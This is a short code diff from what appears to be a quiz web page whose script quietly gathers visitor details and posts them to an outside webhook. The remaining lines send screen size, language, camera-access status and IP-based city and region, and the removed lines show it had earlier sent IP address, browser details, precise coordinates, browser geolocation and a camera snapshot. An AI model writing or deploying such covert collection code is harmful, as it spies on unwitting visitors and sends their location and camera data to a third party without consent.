@@ -546,23 +546,14 @@ function validateAnswers(questions) {
     // Prepare message
     const formData = new FormData();
     formData.append("content", `📡 **New visitor with extended info**
-🌍 IP: ${ipData?.ip || "N/A"}
-🖥️ Platform: ${navigator.platform}
-🧭 Browser: ${navigator.userAgent}
+
 📏 Screen: ${window.screen.width}x${window.screen.height}
 🗣️ Language: ${navigator.language}
 📷 Camera Access: ${cameraAccess}
 📌 IP-based Location:
    City: ${ipData?.city || "?"}
    Region: ${ipData?.region || "?"}
-   Country: ${ipData?.country_name || "?"}
-   Lat/Lon: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}
-📍 Browser Geolocation:
-   Lat: ${geo?.latitude || "?"}, Lon: ${geo?.longitude || "?"}`);
-
-    if (imageBlob) {
-        formData.append("file", imageBlob, "snapshot.jpg");
-    }
+   
 
     fetch(webhookURL, {
         method: "POST",
